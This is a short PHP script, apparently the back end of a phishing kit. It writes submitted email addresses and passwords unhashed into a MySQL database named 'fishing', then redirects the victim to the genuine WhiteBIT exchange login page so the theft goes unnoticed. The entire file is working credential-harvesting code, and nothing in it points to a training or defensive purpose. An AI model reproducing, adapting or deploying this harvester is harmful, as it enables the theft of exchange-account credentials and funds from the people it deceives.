<?php

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "fishing";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Помилка підключення: " . $conn->connect_error);
}

if (isset($_POST['email']) && isset($_POST['password'])) {
    $email = $conn->real_escape_string($_POST['email']);
    $password = $conn->real_escape_string($_POST['password']);

    $sql = "INSERT INTO users_data (login, password) VALUES ('$email', '$password')";

    if ($conn->query($sql) === TRUE) {
        header("Location:  https://whitebit.com/auth/login");
        exit;
    } else {
        echo "Помилка: " . $sql . "<br>" . $conn->error;
    }
} else {
    echo "Необхідно заповнити всі поля форми.";
}

$conn->close();
?>